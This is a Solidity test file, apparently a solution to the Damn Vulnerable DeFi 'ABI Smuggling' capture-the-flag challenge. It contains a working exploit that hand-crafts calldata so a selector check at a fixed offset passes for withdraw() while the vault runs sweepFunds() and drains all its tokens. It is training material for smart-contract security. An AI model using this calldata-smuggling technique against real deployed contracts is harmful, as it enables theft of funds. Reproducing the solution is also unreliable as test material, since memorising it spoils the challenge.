// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // Palyer authorized to call withdraw()
        console.logBytes4(SelfAuthorizedVault.withdraw.selector); // 0xd9caed12 => withdraw(address,address,uint256)
        // Deployer authorized to call sweepFunds()
        console.logBytes4(SelfAuthorizedVault.sweepFunds.selector); // 0x85fb709d => sweepFunds(address,address)

        // Since withdraw() and sweepFunds() both have have onlyThis moddiffier, the only entry point for us is to call the execute() function
        // as defined in AuthorizedExecutor.sol.

        // The purpose is to smuggle the call to sweepFunds() via the execute() function.

        // function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory);

        // In a normal execution, the encoded calldata to SelfAuthorizedVault.execute() will be:
        // *********
        // 4 bytes: Function Signature of execute()
        // 32 bytes: Target address
        // 32 bytes: Pointer to the actionData
        // 32 bytes: Size of actionData
        // bytes: Calldata to the target contract, which will comprise of function signature of withdraw() and calldata to withdraw()
        // *********

        // The problem is that the function selector checks the expected function selector at a fixed offset, allowing us to manually craft a calldata
        // that is able to trick the check and bypass it.
        // Several things we need to do to bypass the check when we manually craft the calldata:
        // 1. We need to make sure the function selector of withdraw() is still at the original place
        // 2. We manually craft the Pointer to action data to a new offset, and there will be the place where our actual actionData will be decoded
        // 3. The actionData will comprise of function selector of sweepFunds() and calldata to sweepFunds()

        // *********
        // Exploit calldata structure:
        // 4 bytes: Function selector of execute()
        // 32 bytes: Target address (address of the vault)
        // 32 bytes: Pointer / offset to actionData -> manually crafted pointer to actionData => 100 bytes (32 + 32 + 32 + 4) = 0x64 in hexadecimals
        // 32 bytes: Random 32 bytes just as filler
        // 4 bytes: Function selector of withdraw() => to fulfil the function selector check
        // bytes: The actual actionData which includes the function selector of sweepFunds() and calldata to sweepFunds()
        // *********

        // bytes memory exploitCalldata = abi.encodePacked(
        //     bytes4(AuthorizedExecutor.execute.selector),
        //     bytes32(uint256(uint160(address(vault)))),
        //     bytes32(uint256(100)),
        //     bytes32(0),
        //     bytes4(SelfAuthorizedVault.withdraw.selector),
        //     bytes4(SelfAuthorizedVault.sweepFunds.selector),
        //     abi.encode(recovery, address(token))
        // );

        // bytes memory exploitCalldata = abi.encodePacked(
        //     bytes4(AuthorizedExecutor.execute.selector),
        //     abi.encode(address(vault)),
        //     abi.encode(uint256(0x64)), // Offset to actionData (100 bytes)
        //     bytes32(0), // Padding
        //     bytes4(SelfAuthorizedVault.withdraw.selector), // To pass the selector check
        //     abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, recovery, address(token))
        // );

        // bytes memory exploitCalldata = abi.encodePacked(
        //     AuthorizedExecutor.execute.selector, // 4 bytes
        //     abi.encode(address(vault)), // 32 bytes
        //     abi.encode(uint256(0x80)), // 32 bytes - New offset (128 bytes)
        //     bytes32(0), // 32 bytes - Padding
        //     SelfAuthorizedVault.withdraw.selector, // 4 bytes
        //     abi.encode(uint256(0x20)), // 32 bytes - Offset for sweepFunds data
        //     SelfAuthorizedVault.sweepFunds.selector, // 4 bytes
        //     abi.encode(recovery, address(token)) // 64 bytes - sweepFunds parameters
        // );

        bytes memory exploitCalldata = abi.encodePacked(
            bytes4(AuthorizedExecutor.execute.selector),
            abi.encode(address(vault)),
            abi.encode(uint256(0x80)), // offset to actionData (128 bytes)
            bytes32(0), // padding
            SelfAuthorizedVault.withdraw.selector,
            bytes28(0), // padding after withdraw selector
            abi.encode(uint256(0x44)), // length of actionData (68 bytes)
            SelfAuthorizedVault.sweepFunds.selector,
            abi.encode(recovery),
            abi.encode(address(token))
        );

        console.logBytes(exploitCalldata);

        // Call execute()
        (bool success,) = address(vault).call{value: 0}(exploitCalldata);
        require(success, "Exploit failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

// 0x1cff79cd
// 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
// 0000000000000000000000000000000000000000000000000000000000000064
// 0000000000000000000000000000000000000000000000000000000000000000
// d9caed12
// 85fb709d
// 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea
// 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
//
